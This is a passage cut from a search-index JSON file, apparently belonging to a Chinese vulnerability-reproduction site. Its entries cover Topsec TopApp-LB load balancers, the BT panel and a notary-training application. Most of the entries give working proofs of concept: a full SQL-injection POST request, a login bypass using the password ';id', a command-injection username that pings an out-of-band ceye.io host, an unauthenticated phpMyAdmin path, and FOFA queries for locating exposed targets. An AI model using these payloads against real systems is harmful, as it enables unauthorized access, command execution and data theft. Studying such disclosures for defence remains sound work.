HTTP/1.1","title":"\u5929\u878d\u4fe1LDP\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%A4%A9%E8%9E%8D%E4%BF%A1/%E5%A4%A9%E8%9E%8D%E4%BF%A1LDP%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/#\u5929\u878d\u4fe1ldp\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e","text":"","title":"\u5929\u878d\u4fe1LDP\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%A4%A9%E8%9E%8D%E4%BF%A1/%E5%A4%A9%E8%9E%8D%E4%BF%A1LDP%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u5929\u878d\u4fe1LDP\u5b58\u5728\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%A4%A9%E8%9E%8D%E4%BF%A1/%E5%A4%A9%E8%9E%8D%E4%BF%A1LDP%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] \u5929\u878d\u4fe1LDP","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%A4%A9%E8%9E%8D%E4%BF%A1/%E5%A4%A9%E8%9E%8D%E4%BF%A1LDP%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u590d\u73b0","text":"POC\u4e3a \u9ed8\u8ba4\u7528\u6237superman\u7684uid=1 POST /?module-auth_user&action=mod_edit.pwd HTTP/1.1","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%A4%A9%E8%9E%8D%E4%BF%A1/%E5%A4%A9%E8%9E%8D%E4%BF%A1%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1TopApp-LB%20Sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","text":"\u5929\u878d\u4fe1\u8d1f\u8f7d\u5747\u8861TopApp-LB Sql\u6ce8\u5165\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u5929\u878d\u4fe1\u8d1f\u8f7d\u5747\u8861 TopAPP-LB\u4ea7\u54c1\u65e7\u7248\u672c\u5728\u7ba1\u7406\u9762\u5b58\u5728SQL\u6ce8\u5165\u6f0f\u6d1e\uff0c\u5177\u4f53\u4e3a\u5728\u53ef\u4ee5\u8bbf\u95ee\u7ba1\u7406\u670d\u52a1\u60c5\u51b5 \u4e0b\uff0c\u653b\u51fb\u8005\u901a\u8fc7\u6784\u9020\u6076\u610f\u8bf7\u6c42\uff0c\u5229\u7528\u7cfb\u7edf\u68c0\u67e5\u8f93\u5165\u6761\u4ef6\u4e0d\u4e25\u683c\u7684\u7f3a\u9677\uff0c\u8fdb\u4e00\u6b65\u53ef\u83b7\u53d6\u90e8\u5206\u7cfb\u7edf\u672c\u5730\u4fe1\u606f \u5f71\u54cd\u7248\u672c \u00b6 \u5929\u878d\u4fe1\u8d1f\u8f7d\u5747\u8861TopApp-LB FOFA \u00b6 [!NOTE] app=\"\u5929\u878d\u4fe1-TopApp-LB-\u8d1f\u8f7d\u5747\u8861\u7cfb\u7edf\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u5229\u7528 \u5929\u878d\u4fe1\u8d1f\u8f7d\u5747\u8861TopApp-LB \u4efb\u610f\u767b\u9646 \u4f7f\u7528\u540e\u53f0 \u63d0\u4ea4\u4ee5\u4e0b\u6570\u636e\u5305 POST /acc/clsf/report/datasource.php HTTP/1.1 Host: Connection: close Accept: text/javascript, text/html, application/xml, text/xml, */* X-Prototype-Version: 1.6.0.3 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: PHPSESSID=ijqtopbcbmu8d70o5t3kmvgt57 Content-Type: application/x-www-form-urlencoded Content-Length: 201 t=l&e=0&s=t&l=1&vid=2147483647 or 1=1&gid=0&lmt=10&o=r_Speed&asc=false&p=8&lipf=&lipt=&ripf=&ript=&dscp=&proto=&lpf=&lpt=&rpf=&rpt=@\u3002\u3002 \u5b58\u5728SQL\u76f2\u6ce8","title":"\u5929\u878d\u4fe1\u8d1f\u8f7d\u5747\u8861TopApp-LB Sql\u6ce8\u5165\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%A4%A9%E8%9E%8D%E4%BF%A1/%E5%A4%A9%E8%9E%8D%E4%BF%A1%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1TopApp-LB%20Sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#\u5929\u878d\u4fe1\u8d1f\u8f7d\u5747\u8861topapp-lb-sql\u6ce8\u5165\u6f0f\u6d1e","text":"","title":"\u5929\u878d\u4fe1\u8d1f\u8f7d\u5747\u8861TopApp-LB Sql\u6ce8\u5165\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%A4%A9%E8%9E%8D%E4%BF%A1/%E5%A4%A9%E8%9E%8D%E4%BF%A1%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1TopApp-LB%20Sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u5929\u878d\u4fe1\u8d1f\u8f7d\u5747\u8861 TopAPP-LB\u4ea7\u54c1\u65e7\u7248\u672c\u5728\u7ba1\u7406\u9762\u5b58\u5728SQL\u6ce8\u5165\u6f0f\u6d1e\uff0c\u5177\u4f53\u4e3a\u5728\u53ef\u4ee5\u8bbf\u95ee\u7ba1\u7406\u670d\u52a1\u60c5\u51b5 \u4e0b\uff0c\u653b\u51fb\u8005\u901a\u8fc7\u6784\u9020\u6076\u610f\u8bf7\u6c42\uff0c\u5229\u7528\u7cfb\u7edf\u68c0\u67e5\u8f93\u5165\u6761\u4ef6\u4e0d\u4e25\u683c\u7684\u7f3a\u9677\uff0c\u8fdb\u4e00\u6b65\u53ef\u83b7\u53d6\u90e8\u5206\u7cfb\u7edf\u672c\u5730\u4fe1\u606f","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%A4%A9%E8%9E%8D%E4%BF%A1/%E5%A4%A9%E8%9E%8D%E4%BF%A1%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1TopApp-LB%20Sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#\u5f71\u54cd\u7248\u672c","text":"\u5929\u878d\u4fe1\u8d1f\u8f7d\u5747\u8861TopApp-LB","title":"\u5f71\u54cd\u7248\u672c"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%A4%A9%E8%9E%8D%E4%BF%A1/%E5%A4%A9%E8%9E%8D%E4%BF%A1%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1TopApp-LB%20Sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#fofa","text":"[!NOTE] app=\"\u5929\u878d\u4fe1-TopApp-LB-\u8d1f\u8f7d\u5747\u8861\u7cfb\u7edf\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%A4%A9%E8%9E%8D%E4%BF%A1/%E5%A4%A9%E8%9E%8D%E4%BF%A1%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1TopApp-LB%20Sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u590d\u73b0","text":"\u5229\u7528 \u5929\u878d\u4fe1\u8d1f\u8f7d\u5747\u8861TopApp-LB \u4efb\u610f\u767b\u9646 \u4f7f\u7528\u540e\u53f0 \u63d0\u4ea4\u4ee5\u4e0b\u6570\u636e\u5305 POST /acc/clsf/report/datasource.php HTTP/1.1 Host: Connection: close Accept: text/javascript, text/html, application/xml, text/xml, */* X-Prototype-Version: 1.6.0.3 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: PHPSESSID=ijqtopbcbmu8d70o5t3kmvgt57 Content-Type: application/x-www-form-urlencoded Content-Length: 201 t=l&e=0&s=t&l=1&vid=2147483647 or 1=1&gid=0&lmt=10&o=r_Speed&asc=false&p=8&lipf=&lipt=&ripf=&ript=&dscp=&proto=&lpf=&lpt=&rpf=&rpt=@\u3002\u3002 \u5b58\u5728SQL\u76f2\u6ce8","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%A4%A9%E8%9E%8D%E4%BF%A1/%E5%A4%A9%E8%9E%8D%E4%BF%A1%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1TopApp-LB%E4%BB%BB%E6%84%8F%E7%99%BB%E9%99%86/","text":"\u5929\u878d\u4fe1\u8d1f\u8f7d\u5747\u8861TopApp-LB\u4efb\u610f\u767b\u9646 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u5929\u878d\u4fe1\u8d1f\u8f7d\u5747\u8861TopApp-LB\u7cfb\u7edf\u65e0\u9700\u5bc6\u7801\u53ef\u76f4\u63a5\u767b\u9646\uff0c\u67e5\u770b\u654f\u611f\u4fe1\u606f \u5f71\u54cd\u7248\u672c \u00b6 \u5929\u878d\u4fe1\u8d1f\u8f7d\u5747\u8861TopApp-LB FOFA \u00b6 [!NOTE] app=\"\u5929\u878d\u4fe1-TopApp-LB-\u8d1f\u8f7d\u5747\u8861\u7cfb\u7edf\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u5728\u767b\u5f55\u9875\u9762\u4e2d\u8f93\u5165\uff0c\u8d26\u53f7: \u4efb\u610f\u8d26\u53f7 \u5bc6\u7801: ;id \u6210\u529f\u767b\u5f55","title":"\u5929\u878d\u4fe1\u8d1f\u8f7d\u5747\u8861TopApp-LB\u4efb\u610f\u767b\u9646"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%A4%A9%E8%9E%8D%E4%BF%A1/%E5%A4%A9%E8%9E%8D%E4%BF%A1%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1TopApp-LB%E4%BB%BB%E6%84%8F%E7%99%BB%E9%99%86/#\u5929\u878d\u4fe1\u8d1f\u8f7d\u5747\u8861topapp-lb\u4efb\u610f\u767b\u9646","text":"","title":"\u5929\u878d\u4fe1\u8d1f\u8f7d\u5747\u8861TopApp-LB\u4efb\u610f\u767b\u9646"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%A4%A9%E8%9E%8D%E4%BF%A1/%E5%A4%A9%E8%9E%8D%E4%BF%A1%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1TopApp-LB%E4%BB%BB%E6%84%8F%E7%99%BB%E9%99%86/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u5929\u878d\u4fe1\u8d1f\u8f7d\u5747\u8861TopApp-LB\u7cfb\u7edf\u65e0\u9700\u5bc6\u7801\u53ef\u76f4\u63a5\u767b\u9646\uff0c\u67e5\u770b\u654f\u611f\u4fe1\u606f","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%A4%A9%E8%9E%8D%E4%BF%A1/%E5%A4%A9%E8%9E%8D%E4%BF%A1%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1TopApp-LB%E4%BB%BB%E6%84%8F%E7%99%BB%E9%99%86/#\u5f71\u54cd\u7248\u672c","text":"\u5929\u878d\u4fe1\u8d1f\u8f7d\u5747\u8861TopApp-LB","title":"\u5f71\u54cd\u7248\u672c"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%A4%A9%E8%9E%8D%E4%BF%A1/%E5%A4%A9%E8%9E%8D%E4%BF%A1%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1TopApp-LB%E4%BB%BB%E6%84%8F%E7%99%BB%E9%99%86/#fofa","text":"[!NOTE] app=\"\u5929\u878d\u4fe1-TopApp-LB-\u8d1f\u8f7d\u5747\u8861\u7cfb\u7edf\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%A4%A9%E8%9E%8D%E4%BF%A1/%E5%A4%A9%E8%9E%8D%E4%BF%A1%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1TopApp-LB%E4%BB%BB%E6%84%8F%E7%99%BB%E9%99%86/#\u6f0f\u6d1e\u590d\u73b0","text":"\u5728\u767b\u5f55\u9875\u9762\u4e2d\u8f93\u5165\uff0c\u8d26\u53f7: \u4efb\u610f\u8d26\u53f7 \u5bc6\u7801: ;id \u6210\u529f\u767b\u5f55","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%A4%A9%E8%9E%8D%E4%BF%A1/%E5%A4%A9%E8%9E%8D%E4%BF%A1%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1TopApp-LB%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","text":"\u5929\u878d\u4fe1\u8d1f\u8f7d\u5747\u8861TopApp-LB\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u5929\u878d\u4fe1\u8d1f\u8f7d\u5747\u8861TopApp-LB\u7cfb\u7edf\u5b58\u5728\u4efb\u610f\u547d\u4ee4\u6267\u884c \u5f71\u54cd\u7248\u672c \u00b6 \u5929\u878d\u4fe1\u8d1f\u8f7d\u5747\u8861TopApp-LB FOFA \u00b6 [!NOTE] app=\"\u5929\u878d\u4fe1-TopApp-LB-\u8d1f\u8f7d\u5747\u8861\u7cfb\u7edf\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u767b\u5f55\u754c\u9762\u4e2d\u5b58\u5728\u547d\u4ee4\u6267\u884c \u8d26\u53f7: 1;ping 6km5dk.ceye.io;echo \u5bc6\u7801: \u4efb\u610f \u6210\u529f\u6536\u5230\u8bf7\u6c42","title":"\u5929\u878d\u4fe1\u8d1f\u8f7d\u5747\u8861TopApp-LB\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%A4%A9%E8%9E%8D%E4%BF%A1/%E5%A4%A9%E8%9E%8D%E4%BF%A1%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1TopApp-LB%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#\u5929\u878d\u4fe1\u8d1f\u8f7d\u5747\u8861topapp-lb\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e","text":"","title":"\u5929\u878d\u4fe1\u8d1f\u8f7d\u5747\u8861TopApp-LB\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%A4%A9%E8%9E%8D%E4%BF%A1/%E5%A4%A9%E8%9E%8D%E4%BF%A1%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1TopApp-LB%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u5929\u878d\u4fe1\u8d1f\u8f7d\u5747\u8861TopApp-LB\u7cfb\u7edf\u5b58\u5728\u4efb\u610f\u547d\u4ee4\u6267\u884c","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%A4%A9%E8%9E%8D%E4%BF%A1/%E5%A4%A9%E8%9E%8D%E4%BF%A1%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1TopApp-LB%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#\u5f71\u54cd\u7248\u672c","text":"\u5929\u878d\u4fe1\u8d1f\u8f7d\u5747\u8861TopApp-LB","title":"\u5f71\u54cd\u7248\u672c"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%A4%A9%E8%9E%8D%E4%BF%A1/%E5%A4%A9%E8%9E%8D%E4%BF%A1%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1TopApp-LB%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#fofa","text":"[!NOTE] app=\"\u5929\u878d\u4fe1-TopApp-LB-\u8d1f\u8f7d\u5747\u8861\u7cfb\u7edf\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%A4%A9%E8%9E%8D%E4%BF%A1/%E5%A4%A9%E8%9E%8D%E4%BF%A1%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1TopApp-LB%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u590d\u73b0","text":"\u767b\u5f55\u754c\u9762\u4e2d\u5b58\u5728\u547d\u4ee4\u6267\u884c \u8d26\u53f7: 1;ping 6km5dk.ceye.io;echo \u5bc6\u7801: \u4efb\u610f \u6210\u529f\u6536\u5230\u8bf7\u6c42","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%AE%9D%E5%A1%94%E8%BF%90%E7%BB%B4%E7%AE%A1%E7%90%86%E9%9D%A2%E6%9D%BF/%E5%AE%9D%E5%A1%94%20phpmyadmin%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/","text":"\u5b9d\u5854 phpmyadmin\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u3010\u5b9d\u5854\u9762\u677f\u3011\u7d27\u6025\u5b89\u5168\u66f4\u65b0\u901a\u77e5\uff0cLinux\u9762\u677f7.4.2\u7248\u672c/Windows\u9762\u677f6.8\u7248\u672c\u5b58\u5728\u5b89\u5168\u9690\u60a3\uff0c\u5176\u4ed6\u7248\u672c\u65e0\u6b64\u98ce\u9669\u3002\u5df2\u53d1\u5e03\u7d27\u6025\u66f4\u65b0\uff0c\u8bf7\u6240\u6709\u4f7f\u7528\u6b64\u7248\u672c\u7684\u7528\u6237\u52a1\u5fc5\u5347\u7ea7\u5230\u6700\u65b0\u7248\uff0c\u66f4\u65b0\u65b9\u6cd5\uff0c\u767b\u5f55\u9762\u677f\u76f4\u63a5\u5347\u7ea7\u66f4\u65b0\u5373\u53ef\uff0c\u5982\u66f4\u65b0\u51fa\u73b0\u95ee\u9898\uff0c\u8bf7\u767b\u5f55\u5b9d\u5854\u8bba\u575b\u53cd\u9988\u6216\u8005\u8054\u7cfb\u5ba2\u670d\u53cd\u9988 \u5f71\u54cd\u7248\u672c \u00b6 [!NOTE] Linux\u6b63\u5f0f\u72487.4.2 Linux\u6d4b\u8bd5\u72487.5.13 Windows\u6b63\u5f0f\u72486.8 \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u8bbf\u95ee http://xxx.xxx.xxx.xxx:888/pma \u5373\u53ef","title":"\u5b9d\u5854 phpmyadmin\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%AE%9D%E5%A1%94%E8%BF%90%E7%BB%B4%E7%AE%A1%E7%90%86%E9%9D%A2%E6%9D%BF/%E5%AE%9D%E5%A1%94%20phpmyadmin%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/#\u5b9d\u5854-phpmyadmin\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e","text":"","title":"\u5b9d\u5854 phpmyadmin\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%AE%9D%E5%A1%94%E8%BF%90%E7%BB%B4%E7%AE%A1%E7%90%86%E9%9D%A2%E6%9D%BF/%E5%AE%9D%E5%A1%94%20phpmyadmin%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u3010\u5b9d\u5854\u9762\u677f\u3011\u7d27\u6025\u5b89\u5168\u66f4\u65b0\u901a\u77e5\uff0cLinux\u9762\u677f7.4.2\u7248\u672c/Windows\u9762\u677f6.8\u7248\u672c\u5b58\u5728\u5b89\u5168\u9690\u60a3\uff0c\u5176\u4ed6\u7248\u672c\u65e0\u6b64\u98ce\u9669\u3002\u5df2\u53d1\u5e03\u7d27\u6025\u66f4\u65b0\uff0c\u8bf7\u6240\u6709\u4f7f\u7528\u6b64\u7248\u672c\u7684\u7528\u6237\u52a1\u5fc5\u5347\u7ea7\u5230\u6700\u65b0\u7248\uff0c\u66f4\u65b0\u65b9\u6cd5\uff0c\u767b\u5f55\u9762\u677f\u76f4\u63a5\u5347\u7ea7\u66f4\u65b0\u5373\u53ef\uff0c\u5982\u66f4\u65b0\u51fa\u73b0\u95ee\u9898\uff0c\u8bf7\u767b\u5f55\u5b9d\u5854\u8bba\u575b\u53cd\u9988\u6216\u8005\u8054\u7cfb\u5ba2\u670d\u53cd\u9988","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%AE%9D%E5%A1%94%E8%BF%90%E7%BB%B4%E7%AE%A1%E7%90%86%E9%9D%A2%E6%9D%BF/%E5%AE%9D%E5%A1%94%20phpmyadmin%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/#\u5f71\u54cd\u7248\u672c","text":"[!NOTE] Linux\u6b63\u5f0f\u72487.4.2 Linux\u6d4b\u8bd5\u72487.5.13 Windows\u6b63\u5f0f\u72486.8","title":"\u5f71\u54cd\u7248\u672c"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%AE%9D%E5%A1%94%E8%BF%90%E7%BB%B4%E7%AE%A1%E7%90%86%E9%9D%A2%E6%9D%BF/%E5%AE%9D%E5%A1%94%20phpmyadmin%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u590d\u73b0","text":"\u8bbf\u95ee http://xxx.xxx.xxx.xxx:888/pma \u5373\u53ef","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%AE%9E%E8%B7%B5%E6%95%99%E5%AD%A6%E5%B9%B3%E5%8F%B0/%E6%9D%AD%E5%B7%9E%E6%B3%95%E6%BA%90%E8%BD%AF%E4%BB%B6%20%E5%85%AC%E8%AF%81%E5%AE%9E%E5%8A%A1%E6%95%99%E5%AD%A6%E8%BD%AF%E4%BB%B6%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","text":"\u676d\u5dde\u6cd5\u6e90\u8f6f\u4ef6 \u516c\u8bc1\u5b9e\u52a1\u6559\u5b66\u8f6f\u4ef6 SQL\u6ce8\u5165\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u676d\u5dde\u6cd5\u6e90\u8f6f\u4ef6 \u516c\u8bc1\u5b9e\u52a1\u6559\u5b66\u8f6f\u4ef6 \u5b58\u5728SQL\u6ce8\u5165\u6f0f\u6d1e \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] \u676d\u5dde\u6cd5\u6e90\u8f6f\u4ef6 \u516c\u8bc1\u5b9e\u52a1\u6559\u5b66\u8f6f\u4ef6 FOFA \u00b6 [!NOTE] FOFA\u6682\u65f6\u672a\u6536\u5f55\u4efb\u4f55\u7f51\u7ad9 \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u767b\u5f55\u9875\u9762\u5982\u4e0b \u767b\u5f55\u6293\u53d6\u8bf7\u6c42\u5305 POST /JusNotary/ HTTP/1.1 Host: xxx.xxx.xxx.xxx Content-Length: 219 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: ASP.NET_SessionId=54zwf05sd1g4zyfpiuxxdmuc x-forwarded-for: 127.0.0.1 x-originating-ip: 127.0.0.1 x-remote-ip: 127.0.0.1 x-remote-addr: 127.0.0.1 Connection: close __EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUKMTE5NTI5NDc1Ng8WAh4TVmFsaWRhdGVSZXF1ZXN0TW9kZQIBZGTTkYMK0k4DlIElq0ua0zvxEhpFH8rCzVrUscEhlVc9pw%3D%3D&__VIEWSTATEGENERATOR=1B0004A3&txtName=123&txtPwd=123&btnSubmit=+ \u5176\u4e2d\u6ce8\u5165\u7684\u53c2\u6570\u4e3a POST\u6570\u636e\u4e2d\u7684 txtName \u53c2\u6570, \u4fdd\u5b58\u4e3a\u6587\u4ef6\u4f7f\u7528 Sqlmap\u8dd1\u4e00\u4e0b","title":"\u676d\u5dde\u6cd5\u6e90\u8f6f\u4ef6 